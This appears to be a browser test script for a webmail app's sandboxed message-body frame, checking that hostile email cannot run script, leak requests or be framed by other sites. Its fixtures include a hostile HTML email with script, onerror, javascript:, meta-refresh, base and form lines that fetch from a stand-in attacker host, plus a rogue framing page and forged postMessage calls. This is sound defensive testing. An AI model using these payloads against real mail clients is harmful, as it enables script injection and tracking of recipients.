// needs: hub mail roof-mail
// Mail's body boundary in a browser (One roof stage 4, s4/spec §3, §7, §10.2; RB1, RB2, RB3, RI10). Mail's own worker
// registered first, as a phone that has opened Mail has it. Part A (MB's own): a page at the hub's address,
// http://ifl.test:8788/, frames Mail's shell at email.ifl.test:8788/body/ with the module's own parent half
// (email/public/roof/bodyframe.js, loaded from the inflite repo beside), exactly as §3.2 builds it, with hostile mail:
// no script runs; nothing reaches the attacker's host until Load, then only for that message; the page can't read a
// frame's document; a forged message changes nothing; heights follow the quotes; a wide newsletter is shrunk; a text
// body is linked and folded; a page at another address can't frame the shell; Mail's worker never keeps or answers a
// frame, online or off. Part B (after MM, MR and MT): the same through the reader at /mail/; it says "part B skipped"
// while the reader is still B0's stub.
import http from 'node:http';
import { randomBytes } from 'node:crypto';
import { readFileSync, existsSync } from 'node:fs';
import { kit } from './lib.mjs';
import { makeAccount, PASSWORD } from './join.mjs';

const [,, S, out] = process.argv;
const K = await kit(S, out);
const { ok, one, hubPhone, hostAsk, HUB, errs } = K;
const MAIL = 'http://email.ifl.test:8788', ACCT = 'http://account.ifl.test:8788';
const ROOFDIR = new URL('../../../inflite/email/public/roof/', import.meta.url);
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

// ---- the attacker's host: every connection and request it gets ----
const EVIL_PORT = 8899, EVIL = `http://evil.gfg.test:${EVIL_PORT}`;
const evil = { conns: 0, hits: [] };
const evilServer = http.createServer((q, r) => {
  evil.hits.push(q.url);
  if (q.url === '/framer') { r.writeHead(200, { 'Content-Type': 'text/html' }); r.end(`<!doctype html><script>addEventListener('message', (e) => fetch('/heard?' + encodeURIComponent(JSON.stringify(e.data))));</script><iframe src="${MAIL}/body/#m=x&t=light&img=0&p=${encodeURIComponent(EVIL)}"></iframe>`); return; }
  r.writeHead(200, { 'Content-Type': 'image/png' }); r.end();
});
evilServer.on('connection', () => evil.conns++);
await new Promise((r) => evilServer.listen(EVIL_PORT, '127.0.0.1', r));
const evilSince = (n) => evil.hits.slice(n);

// ---- George, the site's admin, signed in ----
const george = await hubPhone('george', await K.makeKeys());
const { p, ctx } = george;
await makeAccount(p, `${ACCT}/`, { name: 'George Farrow-Green', handle: 'georgebody', email: 'george@example.com', password: PASSWORD });
const gid = one("SELECT id FROM pg_users WHERE handle = 'georgebody'")[0]?.id;
one(`INSERT OR REPLACE INTO pg_meta (k, v) VALUES ('admin_user', '${gid}')`);
one(`INSERT OR IGNORE INTO pg_passkeys (id, user_id, public_key, alg, created_at) VALUES ('mailbody-key', '${gid}', 'x', -7, ${Date.now()})`);
ok(!!gid, 'George’s account, the site’s admin with a passkey');

// (a message to Mail, through Mail's Worker's own email handler)
function deliver(subject, body, type = 'text/html') {
  const raw = ['From: Rowan Ash <rowan@example.com>', 'To: hello@inflite.ai', `Subject: ${subject}`, `Message-ID: <${randomBytes(8).toString('hex')}@example.com>`,
    `Date: ${new Date().toUTCString()}`, 'MIME-Version: 1.0', `Content-Type: ${type}; charset=utf-8`, '', body, ''].join('\r\n');
  return new Promise((done) => {
    const q = http.request({ host: '127.0.0.1', port: 8806, method: 'POST', agent: false, path: '/cdn-cgi/handler/email?from=rowan%40example.com&to=hello%40inflite.ai',
      headers: { 'Content-Type': 'message/rfc822', 'Content-Length': Buffer.byteLength(raw) } }, (res) => { res.resume(); res.on('end', () => done(res.statusCode)); });
    q.on('error', () => done(0)); q.end(raw);
  });
}
const HOSTILE = `<p id="top">Hello from Rowan</p>
<script>try{parent.parent.__pwned=1}catch(e){}fetch('${EVIL}/script')</script>
<img src="x" onerror="fetch('${EVIL}/onerror')">
<a id="js" href="javascript:fetch('${EVIL}/js')">Tap me</a>
<meta http-equiv="refresh" content="0;url=${EVIL}/refresh">
<base href="${EVIL}/base/">
<link rel="preconnect" href="${EVIL}"><link rel="stylesheet" href="${EVIL}/sheet.css"><link rel="prefetch" href="${EVIL}/prefetch">
<form action="${EVIL}/form" method="get"><input name="q" value="x"><button id="sub">Go</button></form>
<div style="background:url(${EVIL}/cssurl.png)">A picture behind</div>
<img id="pic" src="${EVIL}/pic.png" width="10" height="10">
<p><a id="mt" href="mailto:pat@example.com?subject=Hello%20Pat">Write to Pat</a> or <a id="web" href="${EVIL}/link">a link</a></p>`;
const OTHER = `<p>Another message</p><img src="${EVIL}/other.png">`;
const WIDE = `<table width="5000" bgcolor="#ffffff"><tr><td>A very wide newsletter: ${'word '.repeat(400)}</td></tr></table>`;
const QUOTE = `<p>Yes, Thursday works.</p><p>On Mon, 3 Nov 2026 at 14:02, Pat &lt;pat@example.com&gt; wrote:</p><blockquote type="cite">${Array.from({ length: 60 }, (_, i) => `<p>Old line ${i + 1}</p>`).join('')}</blockquote>`;
const TEXT = `See https://example.com/plan and write to pat@example.com.\n\nOn Mon, Pat wrote:\n> the old words\n> more old words`;
const sent = [];
for (const [subject, body, type] of [['Hostile', HOSTILE], ['Other', OTHER], ['Wide', WIDE], ['Quoted', QUOTE], ['Plain', TEXT, 'text/plain']]) sent.push(await deliver(subject, body, type));
ok(sent.every((s) => s >= 200 && s < 300), 'five messages come to Mail', sent.join());

// ---- Mail's own worker, registered first (as on a phone that has opened Mail) ----
const mailPage = await ctx.newPage();
await mailPage.goto(`${MAIL}/`);
const reg = await mailPage.evaluate(async () => { const r = await navigator.serviceWorker.register('/sw.js'); await navigator.serviceWorker.ready; return !!r.active || !!navigator.serviceWorker.controller || true; }).catch((e) => String(e));
await wait(1500);
const ids = await mailPage.evaluate(async () => {
  const lists = await Promise.all(['', '?view=people', '?view=updates'].map((q) => fetch(`/api/threads${q}`, { credentials: 'same-origin' }).then((r) => r.json()).catch(() => null)));
  const out = {};
  for (const t of lists.flatMap((l) => l?.threads || [])) {
    const th = await (await fetch(`/api/threads/${t.id}`, { credentials: 'same-origin' })).json();
    for (const m of th.messages || []) out[m.subject] = { id: m.id, threadId: m.threadId };
  }
  return out;
});
ok(reg === true && ['Hostile', 'Other', 'Wide', 'Quoted', 'Plain'].every((s) => ids[s]?.id), 'Mail’s worker registered at Mail’s address, and the messages’ ids', JSON.stringify({ reg, ids }));
const keptPage = async () => mailPage.evaluate(async () => { const c = await caches.open('mail-app-2'); const r = await c.match('/'); return r ? (await r.text()).slice(0, 4000) : null; }).catch(() => null);

// ---- Part A: the hub's own page (a real one: the browser checks where a frame's parent was served from), framing the
// shell through the module's own bodyframe.js, loaded from the inflite repo beside ----
await ctx.route(`${HUB}/__roof/**`, (r) => {
  const f = new URL(r.request().url()).pathname.slice('/__roof/'.length);
  const file = new URL(f, ROOFDIR);
  if (!/^[\w.-]+\.js$/.test(f) || !existsSync(file)) return r.fulfill({ status: 404, body: '' });
  return r.fulfill({ status: 200, contentType: 'text/javascript', body: readFileSync(file) });
});
const pageErrs0 = errs.length;
// (what became of each request for the shell, for the log)
const shellNet = [];
p.on('requestfailed', (r) => { if (r.url().startsWith(`${MAIL}/body/`)) shellNet.push(`failed ${r.failure()?.errorText} ${r.url().slice(0, 90)}`); });
p.on('response', (r) => { if (r.url().startsWith(`${MAIL}/body/`)) shellNet.push(`${r.status()} ${r.url().slice(0, 90)}`); });
p.on('console', (m) => { if (/frame|Refused|blocked|Content Security/i.test(m.text())) shellNet.push(`console ${m.text().slice(0, 200)}`); });
await p.goto(`${HUB}/`);
await p.waitForLoadState('load');
await wait(1500);
const TEST = p.url();
const set = await p.evaluate(async () => {
  const BF = await import('/__roof/bodyframe.js');
  window.BF = BF;
  window.said = { remote: [], mailto: [], touched: [] };
  window.frames_ = {};
  // (every height each frame of the module's said, as the page heard it: what "heard" means, whatever the number)
  window.heardH = {};
  addEventListener('message', (e) => {
    if (!Number.isInteger(e.data?.h)) return;
    for (const [k, f] of Object.entries(frames_)) if (f.el.contentWindow === e.source) (heardH[k] ||= []).push(e.data.h);
  });
  window.off = BF.listenFrames({ remote: (id, on) => said.remote.push([id, on]), mailto: (h) => said.mailto.push(h), touched: (id) => said.touched.push(id) });
  // (a list of its own over the page, as the reader's would be: CSSOM only, as the page's policy allows)
  const list = document.createElement('div');
  list.id = 'bodytest';
  Object.assign(list.style, { position: 'absolute', top: '0', left: '0', width: '100%', zIndex: '2147483647', background: '#fff' });
  document.body.append(list);
  window.add = (key, msg, opts) => { const f = BF.bodyFrame(msg, opts); frames_[key] = f; f.el.style.display = 'block'; f.el.style.width = '100%'; f.el.style.border = '0'; list.append(f.el); return f.el.src; };
  return true;
}).catch((e) => String(e));
ok(set === true, 'the module’s bodyframe.js on the hub’s page', String(set));
const msg = (s) => ({ id: ids[s].id, threadId: ids[s].threadId, from: { name: 'Rowan Ash', email: 'rowan@example.com' } });
const evil0 = evil.hits.length, conns0 = evil.conns;
const srcs = {};
for (const s of ['Hostile', 'Other', 'Wide', 'Quoted', 'Plain']) srcs[s] = await p.evaluate(([k, m, eager]) => window.add(k, m, { theme: 'light', eager }), [s, msg(s), true]);
ok(srcs.Hostile === `${MAIL}/body/#m=${ids.Hostile.id}&t=light&img=0&p=${encodeURIComponent(HUB)}`, 'the frame’s address: Mail’s shell, the message, the theme, no pictures, the parent', srcs.Hostile);
const heights = async () => p.evaluate(() => Object.fromEntries(Object.entries(frames_).map(([k, f]) => [k, Number(f.el.getAttribute('height'))])));
// (the frames' heights and what each said, read together)
const heardOf = async () => p.evaluate(() => ({ h: Object.fromEntries(Object.entries(frames_).map(([k, f]) => [k, Number(f.el.getAttribute('height'))])), said: JSON.parse(JSON.stringify(window.heardH)) }));
let seen = await heardOf();
for (let i = 0; i < 60 && !['Hostile', 'Other', 'Wide', 'Quoted', 'Plain'].every((k) => seen.said[k]?.length); i++) { await wait(250); seen = await heardOf(); }
await wait(1500);
seen = await heardOf();
const { h: h1, said: said1 } = seen;
const measured = Object.fromEntries(await Promise.all(Object.keys(h1).map(async (k) => {
  const shell = p.frames().find((f) => f.url().startsWith(`${MAIL}/body/`) && f.url().includes(`m=${ids[k].id}`));
  return [k, await shell.locator('#b').evaluate((e) => Math.ceil(e.getBoundingClientRect().height))];
})));
// (a real height, the message's own: never a shell's first empty layout (40), which would stop the page's 6 s rule)
ok(Object.keys(h1).every((k) => said1[k]?.length && h1[k] >= 40 && h1[k] === said1[k].at(-1) && !said1[k].includes(40) && Math.abs(h1[k] - measured[k]) <= 1) && ['Hostile', 'Quoted'].every((k) => h1[k] > 64),
  'every frame reports its rendered message height, never an empty shell (newsletter zoom may produce a short frame)', JSON.stringify({ h1, measured, said1, shellNet: shellNet.slice(0, 12), frames: p.frames().map((f) => f.url().slice(0, 80)) }));
await p.screenshot({ path: `${out}/frames.png`, fullPage: true });

// (the shell drew the message: its inner frame, from the shell's own document, as Playwright can see it)
const shellOf = (s) => p.frames().find((f) => f.url().startsWith(`${MAIL}/body/`) && f.url().includes(`m=${ids[s].id}`));
const innerOf = (s) => shellOf(s)?.childFrames()[0];
const look = await innerOf('Hostile')?.evaluate(() => ({ top: document.getElementById('top')?.textContent, scripts: document.scripts.length, metas: document.querySelectorAll('meta[http-equiv=refresh], link, base[href]').length,
  base: document.querySelector('base')?.getAttribute('target'), csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content })).catch((e) => String(e));
ok(look?.top === 'Hello from Rowan' && look.scripts === 0 && look.metas === 0 && look.base === '_blank' && look.csp === "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; font-src data:",
  'the hostile mail drawn in the shell’s inner frame: no script, no refresh, no link, no base of its own, the strict policy', JSON.stringify(look));
const sandbox = await shellOf('Hostile')?.evaluate(() => document.querySelector('iframe')?.getAttribute('sandbox')).catch(() => null);
ok(sandbox === 'allow-same-origin allow-popups allow-popups-to-escape-sandbox', 'the inner frame’s sandbox: never allow-scripts', sandbox);

// (the hub's page: no script of the mail ran here, and it can't read a frame's document)
const hub = await p.evaluate(() => ({ pwned: window.__pwned ?? null, docs: [...document.querySelectorAll('iframe.mail-body')].map((f) => f.contentDocument === null), url: location.href }));
ok(hub.pwned === null && hub.docs.length === 5 && hub.docs.every(Boolean) && hub.url === TEST, 'no script ran; every frame’s document is out of the page’s reach (contentDocument null); the page never moved', JSON.stringify(hub));
const said0 = await p.evaluate(() => window.said);
ok(JSON.stringify(said0.remote.filter(([id]) => id === ids.Hostile.id).at(-1)) === JSON.stringify([ids.Hostile.id, true]), 'the hostile mail’s remote pictures are reported as hidden (the module’s banner)', JSON.stringify(said0.remote));

// (taps inside: a javascript: link does nothing, the form doesn't send, the mailto: comes to the page as an address only)
const inner = innerOf('Hostile');
await inner?.click('#js').catch(() => {});
await inner?.click('#sub').catch(() => {});
await wait(1200);
await inner?.click('#mt').catch(() => {});
await wait(800);
const saidTap = await p.evaluate(() => window.said);
ok(JSON.stringify(saidTap.mailto) === JSON.stringify(['mailto:pat@example.com?subject=Hello%20Pat']), 'a mailto: link tapped: its address comes to the page, nothing else', JSON.stringify(saidTap.mailto));
ok(saidTap.touched.includes(ids.Hostile.id), 'touched: said to the page (its updater waits)', JSON.stringify(saidTap.touched));
await wait(1500);
ok(evilSince(evil0).length === 0 && evil.conns === conns0, 'nothing reached the attacker’s host: no script, no error handler, no javascript:, no refresh, no base, no preconnect or sheet, no form, no CSS url(), no picture', JSON.stringify({ hits: evilSince(evil0), conns: evil.conns - conns0 }));

// (Load: this message's pictures, and only this message's)
await p.evaluate(() => frames_.Hostile.allowImages());
for (let i = 0; i < 40 && !evilSince(evil0).length; i++) await wait(250);
await wait(1500);
const loaded = evilSince(evil0);
ok(loaded.length > 0 && loaded.every((u) => ['/pic.png', '/cssurl.png'].includes(u)), 'Load: the hostile mail’s pictures come, and only pictures (no script, link, form or refresh with them)', JSON.stringify(loaded));
ok(!loaded.includes('/other.png'), 'and only that message’s: the other message’s picture stays hidden', JSON.stringify(loaded));
// (a link in the mail with no target of its own: a window of its own (the shell's <base target="_blank">), with no way
// back to this page, and the frame itself stays on the message)
const evilPop = evil.hits.length;
const [pop] = await Promise.all([ctx.waitForEvent('page', { timeout: 8000 }).catch(() => null), innerOf('Hostile')?.click('#web').catch(() => {})]);
// (the new window opens blank, then goes: its address, or the link's host hearing from it, says it went)
await pop?.waitForURL(`${EVIL}/link`, { timeout: 8000 }).catch(() => {});
await pop?.waitForLoadState('domcontentloaded').catch(() => {});
const popSeen = pop ? { url: pop.url(), went: evilSince(evilPop).includes('/link'), opener: await pop.evaluate(() => window.opener === null).catch((e) => String(e)) } : null;
ok((popSeen?.url === `${EVIL}/link` || popSeen?.went) && popSeen.opener === true && innerOf('Hostile')?.url() === 'about:srcdoc', 'a link in the mail opens in a window of its own, with no opener, and the frame stays on the message', JSON.stringify({ popSeen, inner: innerOf('Hostile')?.url() }));
await pop?.close().catch(() => {});
const src2 = await p.evaluate(() => frames_.Hostile.el.src);
ok(src2.includes('&img=1&') && (await p.evaluate(() => frames_.Other.el.src)).includes('&img=0&'), 'Load: img=1 on that frame’s address alone', src2);

// (forged messages: from the page itself, from another frame at Mail's address, of another shape: nothing changes)
const before = await heights();
await p.evaluate((id) => { postMessage({ ifl: 'mailbody', v: 1, id, h: 999, remote: true, mailto: 'mailto:evil@example.com' }, '*'); }, ids.Quoted.id);
await p.evaluate(([m, id, hub]) => { const f = document.createElement('iframe'); f.name = 'rogue'; f.style.width = '200px'; f.src = `${m}/body/#m=${id}&t=light&img=0&p=${encodeURIComponent(hub)}`; document.body.append(f); }, [MAIL, ids.Quoted.id, HUB]);
await wait(3500);
const after = await heights();
const saidForged = await p.evaluate(() => window.said);
ok(after.Quoted === before.Quoted && !saidForged.mailto.includes('mailto:evil@example.com'), 'a forged message from the page, or a frame at Mail’s address the module didn’t make, changes nothing', JSON.stringify({ before: before.Quoted, after: after.Quoted }));
await p.evaluate(() => document.querySelector('iframe[name=rogue]')?.remove());

// (heights follow the quotes: folded short; shown, taller; a wide newsletter shrunk, on a white card)
const qBefore = (await heights()).Quoted;
await shellOf('Quoted')?.click('.quote-toggle').catch(() => {});
let qAfter = qBefore;
for (let i = 0; i < 20 && qAfter <= qBefore; i++) { await wait(250); qAfter = (await heights()).Quoted; }
ok(qAfter > qBefore + 300, 'Show Quoted Text: the frame grows to the quote, told to the page', `${qBefore} → ${qAfter}`);
await shellOf('Quoted')?.click('.quote-toggle').catch(() => {});
let qBack = qAfter;
for (let i = 0; i < 20 && qBack >= qAfter; i++) { await wait(250); qBack = (await heights()).Quoted; }
ok(qBack < qAfter, 'Hide Quoted Text: back down', `${qAfter} → ${qBack}`);
const wide = await innerOf('Wide')?.evaluate(() => ({ zoom: document.body.style.zoom, sw: document.documentElement.scrollWidth })).catch(() => null);
const wideCard = await p.evaluate(() => frames_.Wide.el.classList.contains('designed'));
ok(wide && Number(wide.zoom) > 0 && Number(wide.zoom) < 1 && wideCard, 'a 5000 px newsletter: shrunk to fit (zoom), on the white card', JSON.stringify({ wide, wideCard }));
const plain = await innerOf('Plain')?.evaluate(() => ({ link: document.querySelector('a[href="https://example.com/plan"]')?.target, mail: !!document.querySelector('a[href="mailto:pat@example.com"]'),
  quoted: getComputedStyle(document.querySelector('.quoted')).display })).catch(() => null);
ok(plain?.link === '_blank' && plain.mail && plain.quoted === 'none', 'a text body: linked, its quote folded, in the same inner frame', JSON.stringify(plain));

// (theme: posted to the frames, and they redraw dark)
await p.evaluate(() => window.BF.themeAll('dark'));
await wait(1200);
const dark = await innerOf('Plain')?.evaluate(() => getComputedStyle(document.body).color).catch(() => null);
ok(dark === 'rgb(245, 246, 251)', 'a theme change: the shell redraws in Mail’s dark colours', dark);

// (a page at another address can't frame the shell: frame-ancestors, and the shell answers no one else)
const q = await ctx.newPage();
const evil1 = evil.hits.length;
await q.goto(`${EVIL}/framer`);
await wait(3000);
ok(!evilSince(evil1).some((u) => u.startsWith('/heard')), 'a page at another address can’t frame the shell, and hears nothing from it', JSON.stringify(evilSince(evil1)));
await q.close();

// (Mail's own worker: Mail's kept page is still Mail's, never the shell; offline, a frame is the browser's error, never
// Mail's whole page, and no false "Couldn't show")
const kept = await keptPage();
ok(kept === null || (!/body\/body\.js/.test(kept) && /app\.js/.test(kept)), 'Mail’s worker kept Mail’s page, never a frame’s', kept?.slice(0, 120));
await ctx.setOffline(true);
await p.evaluate((m) => window.add('Offline', m, { theme: 'dark', eager: true }), msg('Other'));
await wait(7000);
const offFrame = p.frames().find((f) => f.url().includes(`m=${ids.Other.id}&t=dark`));
const offDrawn = offFrame ? await offFrame.evaluate(() => !!document.querySelector('script[src="/app.js"], .pane, #app')).catch(() => false) : false;
const offCover = await p.evaluate(() => !!frames_.Offline.el.nextElementSibling?.classList.contains('mail-body-cover'));
// (and nothing heard from it: its height still the page's own 120, so it's the offline rule that holds the cover back,
// not a height the shell said, kept or not)
const offH = await p.evaluate(() => [Number(frames_.Offline.el.getAttribute('height')), window.heardH.Offline || []]);
ok(!offDrawn && !offCover && offH[0] === 120 && !offH[1].length, 'offline: the frame is the browser’s error, not Mail’s whole page; nothing heard (still 120); and no “Couldn’t show” (the module’s offline state covers it)', JSON.stringify({ offDrawn, offCover, offH }));
await ctx.setOffline(false);
const kept2 = await keptPage();
ok(kept2 === null || !/body\/body\.js/.test(kept2), 'and Mail’s kept page still Mail’s after', kept2?.slice(0, 80));
// (the browser's own refusals of the hostile mail, from inside the frames, are the proof above, not errors: its policy
// refusing a base, a picture or a javascript: link, the sandbox refusing a script or a form)
const refusal = /violates the following Content Security Policy directive|because the (document's|form's) frame is sandboxed and the 'allow-(scripts|forms)' permission is not set/;
const otherErrs = errs.slice(pageErrs0).filter((e) => !refusal.test(e) && !/net::ERR_INTERNET_DISCONNECTED|Failed to fetch|Load failed/i.test(e));
ok(otherErrs.length === 0, 'no error on the page (the browser’s refusals of the hostile mail aside)', JSON.stringify(otherErrs));
ok(errs.slice(pageErrs0).some((e) => /Blocked script execution in 'about:srcdoc'/.test(e)) && errs.slice(pageErrs0).some((e) => /Blocked form submission/.test(e)), 'and the refusals were the sandbox’s: the mail’s script and form refused');

// (online, a message Mail hasn't got (deleted, say): the shell loads but has nothing to draw, so says nothing, and the
// page covers the frame in about 6 s: "Couldn't show this message · Open in Mail", to that conversation in Mail)
const goneAt = Date.now();
await p.evaluate((m) => window.add('Gone', m, { theme: 'light', eager: true }), { ...msg('Other'), id: 'nosuchmessage' });
let gone = null;
for (let i = 0; i < 40; i++) {
  gone = await p.evaluate(() => { const f = frames_.Gone.el, c = f.nextElementSibling; return { h: Number(f.getAttribute('height')), said: window.heardH.Gone || [], hidden: f.hidden, cover: c?.classList.contains('mail-body-cover') ? c.textContent : null, href: c?.querySelector('a')?.href || null }; });
  if (gone.cover) break;
  await wait(250);
}
const goneMs = Date.now() - goneAt;
ok(gone?.cover === 'Couldn’t show this message · Open in Mail' && gone.href === `${MAIL}/#thread=${ids.Other.threadId}` && gone.hidden && gone.h === 120 && !gone.said.length && goneMs < 9500,
  'online, a message Mail hasn’t got: nothing heard, and the frame covered within about 7 s, with Open in Mail', JSON.stringify({ gone, goneMs }));

// ---- Part B: through the reader at /mail/ (after MM, MR and MT are merged) ----
const readerStub = !existsSync(new URL('reader.js', ROOFDIR)) || /export const STUB = true/.test(readFileSync(new URL('reader.js', ROOFDIR), 'utf8'));
if (readerStub) console.log('part B skipped: reader is still a stub');
else {
  const H = await import('./roofhooks.mjs');
  const asked = [];
  p.on('request', (r) => { if (r.url().startsWith(`${MAIL}/api/`) && r.frame() === p.mainFrame()) asked.push(`${r.method()} ${new URL(r.url()).pathname}`); });
  await p.goto(`${HUB}/mail/#thread=${ids.Hostile.threadId}`);
  const frame = await p.waitForSelector(H.MAIL_BODY, { timeout: 30000 }).then(() => true, () => false);
  const b = frame ? await p.evaluate((sel) => { const f = document.querySelector(sel); return { src: f.src, doc: f.contentDocument === null, sandbox: f.getAttribute('sandbox') }; }, H.MAIL_BODY) : null;
  ok(b?.src.startsWith(`${MAIL}/body/#`) && b.doc && b.sandbox === 'allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox', 'B: the reader frames Mail’s shell', JSON.stringify(b));
  await wait(2500);
  ok(!asked.some((a) => /^GET \/api\/messages\/[\w-]+(\/raw)?$/.test(a)), 'B: the page never asked Mail for a body', JSON.stringify(asked));
  ok(p.url().startsWith(`${HUB}/mail/`), 'B: the page never navigated', p.url());
}

console.log('notes (page errors and console errors):', JSON.stringify(errs.slice(0, 8)));
evilServer.close();
await ctx.close();
await (await K.hubBrowser()).close();
await K.b.close();
console.log(`FAILS ${K.fails()}`);
process.exit(0);
